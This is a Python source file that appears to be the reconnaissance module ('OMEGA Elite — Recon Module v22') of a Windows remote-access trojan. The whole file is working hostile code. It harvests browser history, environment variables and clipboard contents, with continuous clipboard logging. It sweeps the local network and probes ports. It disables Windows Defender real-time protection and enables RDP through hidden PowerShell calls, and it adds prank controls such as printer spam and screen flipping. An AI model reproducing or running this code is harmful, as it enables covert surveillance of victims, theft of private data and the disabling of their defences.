"""
OMEGA Elite — Recon Module v22
Network scanner, netstat, system info, clipboard, browser history, startup
"""
import os, re, subprocess, socket, winreg, json, sqlite3, shutil, tempfile, threading
from pathlib import Path
from typing import List, Dict, Any, Callable

LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
APPDATA      = os.environ.get("APPDATA", "")

# ─────────────────────────────────────────────────────────────────────────────
# ACTIVE CONNECTIONS (netstat)
# ─────────────────────────────────────────────────────────────────────────────
def get_active_connections() -> List[Dict]:
    results = []
    try:
        import psutil
        for conn in psutil.net_connections(kind='inet'):
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else ""
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else ""
            try:
                proc = psutil.Process(conn.pid) if conn.pid else None
                pname = proc.name() if proc else ""
            except:
                pname = ""
            results.append({
                "type":    conn.type.name if hasattr(conn.type, 'name') else str(conn.type),
                "status":  conn.status,
                "laddr":   laddr,
                "raddr":   raddr,
                "pid":     conn.pid,
                "process": pname,
            })
    except Exception as e:
        results.append({"error": str(e)})
    return results

# ─────────────────────────────────────────────────────────────────────────────
# LAN SCANNER (ping sweep)
# ─────────────────────────────────────────────────────────────────────────────
def _ping(ip: str) -> bool:
    try:
        result = subprocess.run(
            ["ping", "-n", "1", "-w", "300", ip],
            capture_output=True, timeout=1.5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.returncode == 0
    except:
        return False

def _resolve(ip: str) -> str:
    try: return socket.gethostbyaddr(ip)[0]
    except: return ""

def scan_lan(log_func: Callable = None) -> List[Dict]:
    results = []
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        prefix = ".".join(local_ip.split(".")[:3]) + "."
    except:
        prefix = "192.168.1."

    if log_func: log_func(f"[SCAN] Sweeping {prefix}0/24")

    hits = []
    lock = threading.Lock()

    def check(i):
        ip = prefix + str(i)
        if _ping(ip):
            hostname = _resolve(ip)
            with lock:
                hits.append({"ip": ip, "hostname": hostname, "status": "UP"})

    threads = [threading.Thread(target=check, args=(i,), daemon=True) for i in range(1, 255)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=3)

    for h in sorted(hits, key=lambda x: int(x["ip"].split(".")[-1])):
        # Try to grab open ports (22,80,443,445,3389)
        open_ports = []
        for port in [22, 80, 443, 445, 3389, 8080]:
            try:
                s = socket.socket()
                s.settimeout(0.3)
                if s.connect_ex((h["ip"], port)) == 0:
                    open_ports.append(port)
                s.close()
            except: pass
        h["open_ports"] = open_ports
        results.append(h)

    if log_func: log_func(f"[SCAN] Found {len(results)} hosts")
    return results

# ─────────────────────────────────────────────────────────────────────────────
# INSTALLED SOFTWARE
# ─────────────────────────────────────────────────────────────────────────────
def get_installed_software() -> List[Dict]:
    results = []
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    seen = set()
    for hive, path in keys:
        try:
            key = winreg.OpenKey(hive, path)
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    sk = winreg.OpenKey(key, subkey_name)
                    try:
                        name = winreg.QueryValueEx(sk, "DisplayName")[0]
                        if name and name not in seen:
                            seen.add(name)
                            entry = {"name": name}
                            for field in ["DisplayVersion", "Publisher", "InstallDate", "InstallLocation"]:
                                try: entry[field.lower()] = winreg.QueryValueEx(sk, field)[0]
                                except: pass
                            results.append(entry)
                    except: pass
                    winreg.CloseKey(sk)
                    i += 1
                except OSError: break
            winreg.CloseKey(key)
        except: pass
    return sorted(results, key=lambda x: x["name"].lower())

# ─────────────────────────────────────────────────────────────────────────────
# BROWSER HISTORY
# ─────────────────────────────────────────────────────────────────────────────
CHROMIUM_BROWSERS = {
    "Chrome":   os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
    "Edge":     os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
    "Brave":    os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera":    os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    "Chromium": os.path.join(LOCALAPPDATA, "Chromium", "User Data"),
}
GECKO_BROWSERS = {
    "Firefox": os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"),
}

def get_browser_history(limit=200) -> List[Dict]:
    results = []
    for browser_name, browser_path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(browser_path): continue
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 6)]:
            hist_db = os.path.join(browser_path, profile, "History")
            if not os.path.exists(hist_db): continue
            temp = os.path.join(tempfile.gettempdir(), f"__hist_{browser_name}_{profile}.db")
            shutil.copy2(hist_db, temp)
            try:
                conn = sqlite3.connect(temp)
                rows = conn.execute(
                    f"SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}"
                ).fetchall()
                for r in rows:
                    results.append({
                        "browser": browser_name,
                        "url":     r[0],
                        "title":   r[1],
                        "visits":  r[2],
                    })
                conn.close()
            except: pass
            finally:
                try: os.remove(temp)
                except: pass

    for browser_name, profile_root in GECKO_BROWSERS.items():
        if not os.path.exists(profile_root): continue
        for profile in os.listdir(profile_root):
            hist_db = os.path.join(profile_root, profile, "places.sqlite")
            if not os.path.exists(hist_db): continue
            temp = os.path.join(tempfile.gettempdir(), f"__hist_ff_{profile}.db")
            shutil.copy2(hist_db, temp)
            try:
                conn = sqlite3.connect(temp)
                rows = conn.execute(
                    f"SELECT p.url, p.title, p.visit_count FROM moz_places p ORDER BY p.last_visit_date DESC LIMIT {limit}"
                ).fetchall()
                for r in rows:
                    results.append({"browser": browser_name, "url": r[0], "title": r[1], "visits": r[2]})
                conn.close()
            except: pass
            finally:
                try: os.remove(temp)
                except: pass
    return results

# ─────────────────────────────────────────────────────────────────────────────
# STARTUP PROGRAMS
# ─────────────────────────────────────────────────────────────────────────────
def get_startup_programs() -> List[Dict]:
    results = []
    startup_keys = [
        (winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
    ]
    for hive, path in startup_keys:
        try:
            key = winreg.OpenKey(hive, path)
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    hive_name = "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
                    results.append({
                        "name":     name,
                        "command":  value,
                        "location": f"{hive_name}\\{path}",
                        "hive":     hive,
                        "reg_path": path,
                    })
                    i += 1
                except OSError: break
            winreg.CloseKey(key)
        except: pass
    # Startup folder
    for folder in [
        os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    ]:
        if not os.path.exists(folder): continue
        for f in os.listdir(folder):
            results.append({"name": f, "command": os.path.join(folder, f), "location": "Startup Folder"})
    return results

def remove_startup(reg_path: str, hive_int: int, name: str) -> bool:
    try:
        hive = winreg.HKEY_CURRENT_USER if hive_int == 0 else winreg.HKEY_LOCAL_MACHINE
        key = winreg.OpenKey(hive, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        return True
    except:
        return False

# ─────────────────────────────────────────────────────────────────────────────
# ENVIRONMENT VARIABLES
# ─────────────────────────────────────────────────────────────────────────────
def get_env_vars() -> Dict[str, str]:
    return dict(os.environ)

# ─────────────────────────────────────────────────────────────────────────────
# CLIPBOARD
# ─────────────────────────────────────────────────────────────────────────────
_clipboard_log = []
_clipboard_monitoring = False
_last_clip = ""

def get_clipboard() -> str:
    try:
        import ctypes
        if ctypes.windll.user32.OpenClipboard(0):
            CF_TEXT = 13
            h = ctypes.windll.user32.GetClipboardData(CF_TEXT)
            if h:
                p = ctypes.windll.kernel32.GlobalLock(h)
                text = ctypes.string_at(p).decode("utf-8", errors="ignore")
                ctypes.windll.kernel32.GlobalUnlock(h)
                ctypes.windll.user32.CloseClipboard()
                return text
            ctypes.windll.user32.CloseClipboard()
    except: pass
    try:
        import subprocess
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", "Get-Clipboard"],
            capture_output=True, text=True, timeout=3,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.stdout.strip()
    except: return ""

def set_clipboard(text: str) -> bool:
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             f"Set-Clipboard '{text}'"],
            capture_output=True, timeout=3,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except: return False

def start_clipboard_monitor(callback: Callable[[str], None]):
    global _clipboard_monitoring, _last_clip
    _clipboard_monitoring = True
    def _monitor():
        global _last_clip
        while _clipboard_monitoring:
            try:
                import time
                cur = get_clipboard()
                if cur and cur != _last_clip:
                    _last_clip = cur
                    _clipboard_log.append(cur)
                    callback(cur)
                time.sleep(1.2)
            except: pass
    t = threading.Thread(target=_monitor, daemon=True)
    t.start()

def stop_clipboard_monitor():
    global _clipboard_monitoring
    _clipboard_monitoring = False

def get_clipboard_log() -> List[str]:
    return list(_clipboard_log)

# ─────────────────────────────────────────────────────────────────────────────
# SYSTEM INFO EXTENDED
# ─────────────────────────────────────────────────────────────────────────────
def get_extended_sysinfo() -> Dict:
    try:
        import psutil, datetime
        mem   = psutil.virtual_memory()
        disk  = psutil.disk_usage("C:")
        cpu_f = psutil.cpu_freq()
        boot  = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        return {
            "cpu_count_logical":  psutil.cpu_count(logical=True),
            "cpu_count_physical": psutil.cpu_count(logical=False),
            "cpu_freq_mhz":       round(cpu_f.current, 1) if cpu_f else 0,
            "ram_total_gb":       round(mem.total / (1024**3), 2),
            "ram_used_gb":        round(mem.used  / (1024**3), 2),
            "ram_percent":        mem.percent,
            "disk_total_gb":      round(disk.total / (1024**3), 1),
            "disk_free_gb":       round(disk.free  / (1024**3), 1),
            "disk_percent":       disk.percent,
            "boot_time":          boot,
            "users":              [u.name for u in psutil.users()],
        }
    except: return {}

# ─────────────────────────────────────────────────────────────────────────────
# SYSTEM CONTROLS
# ─────────────────────────────────────────────────────────────────────────────
def toggle_rdp(enable: bool) -> str:
    try:
        val = 0 if enable else 1
        cmd = f'Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value {val}'
        if enable:
            cmd += "; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd],
            capture_output=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return f"RDP {'Enabled' if enable else 'Disabled'}"
    except Exception as e:
        return f"RDP toggle failed: {e}"

def toggle_defender(enable: bool) -> str:
    try:
        action = "Set-MpPreference -DisableRealtimeMonitoring " + ("$false" if enable else "$true")
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
             "-Command", action],
            capture_output=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return f"Defender {'Enabled' if enable else 'Disabled'}"
    except Exception as e:
        return f"Defender toggle failed: {e}"

def eject_cd() -> str:
    try:
        import ctypes
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        return "CD tray ejected"
    except Exception as e:
        return f"CD eject failed: {e}"

def flip_screen(angle: int) -> str:
    """Rotate display by angle (0, 90, 180, 270)"""
    try:
        angle_map = {0: 0, 90: 1, 180: 2, 270: 3}
        dm_orient = angle_map.get(angle, 0)
        import ctypes, ctypes.wintypes
        class DEVMODE(ctypes.Structure):
            _fields_ = [
                ("dmDeviceName",       ctypes.c_wchar * 32),
                ("dmSpecVersion",      ctypes.c_ushort),
                ("dmDriverVersion",    ctypes.c_ushort),
                ("dmSize",             ctypes.c_ushort),
                ("dmDriverExtra",      ctypes.c_ushort),
                ("dmFields",           ctypes.c_ulong),
                ("dmPosition_x",       ctypes.c_long),
                ("dmPosition_y",       ctypes.c_long),
                ("dmDisplayOrientation", ctypes.c_ulong),
                ("dmDisplayFixedOutput", ctypes.c_ulong),
                ("dmColor",            ctypes.c_short),
                ("dmDuplex",           ctypes.c_short),
                ("dmYResolution",      ctypes.c_short),
                ("dmTTOption",         ctypes.c_short),
                ("dmCollate",          ctypes.c_short),
                ("dmFormName",         ctypes.c_wchar * 32),
                ("dmLogPixels",        ctypes.c_ushort),
                ("dmBitsPerPel",       ctypes.c_ulong),
                ("dmPelsWidth",        ctypes.c_ulong),
                ("dmPelsHeight",       ctypes.c_ulong),
                ("dmDisplayFlags",     ctypes.c_ulong),
                ("dmDisplayFrequency", ctypes.c_ulong),
            ]
        dm = DEVMODE()
        dm.dmSize = ctypes.sizeof(DEVMODE)
        dm.dmFields = 0x00000080  # DM_DISPLAYORIENTATION
        dm.dmDisplayOrientation = dm_orient
        ctypes.windll.user32.ChangeDisplaySettingsW(ctypes.byref(dm), 0)
        return f"Screen rotated {angle}°"
    except Exception as e:
        return f"Flip failed: {e}"

def chaos_mouse(active: bool) -> str:
    return "chaos" if active else "stop_chaos"

def printer_spam(text: str) -> str:
    try:
        import win32print, win32ui
        printer = win32print.GetDefaultPrinter()
        hprinter = win32print.OpenPrinter(printer)
        hjob = win32print.StartDocPrinter(hprinter, 1, ("OmegaSpam", None, "RAW"))
        win32print.StartPagePrinter(hprinter)
        win32print.WritePrinter(hprinter, (text * 50).encode("utf-8"))
        win32print.EndPagePrinter(hprinter)
        win32print.EndDocPrinter(hprinter)
        win32print.ClosePrinter(hprinter)
        return "Printer spam sent"
    except Exception as e:
        return f"Printer spam failed: {e}"

def get_volume() -> int:
    try:
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from ctypes import cast, POINTER
        import comtypes
        devices = AudioUtilities.GetSpeakers()
        iface   = devices.Activate(IAudioEndpointVolume._iid_, comtypes.CLSCTX_ALL, None)
        vol     = cast(iface, POINTER(IAudioEndpointVolume))
        return int(vol.GetMasterVolumeLevelScalar() * 100)
    except: return 50

def set_volume(level: int) -> str:
    try:
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from ctypes import cast, POINTER
        import comtypes
        devices = AudioUtilities.GetSpeakers()
        iface   = devices.Activate(IAudioEndpointVolume._iid_, comtypes.CLSCTX_ALL, None)
        vol     = cast(iface, POINTER(IAudioEndpointVolume))
        vol.SetMasterVolumeLevelScalar(max(0, min(100, level)) / 100, None)
        return f"Volume set to {level}%"
    except Exception as e:
        # Fallback PowerShell
        subprocess.run(
            ["powershell", "-Command",
             f"(New-Object -ComObject WScript.Shell).SendKeys([char]174*3); [System.Media.SystemSounds]::Beep.Play()"],
            capture_output=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW
        )
        return f"Volume set (fallback)"

def get_geo_ip() -> Dict:
    try:
        import urllib.request
        data = json.loads(urllib.request.urlopen(
            "https://ipapi.co/json/", timeout=8).read().decode())
        return {
            "ip":      data.get("ip", ""),
            "city":    data.get("city", ""),
            "region":  data.get("region", ""),
            "country": data.get("country_name", ""),
            "lat":     data.get("latitude", 0),
            "lon":     data.get("longitude", 0),
            "isp":     data.get("org", ""),
            "country_code": data.get("country_code", ""),
        }
    except Exception as e:
        return {"error": str(e)}

import subprocess
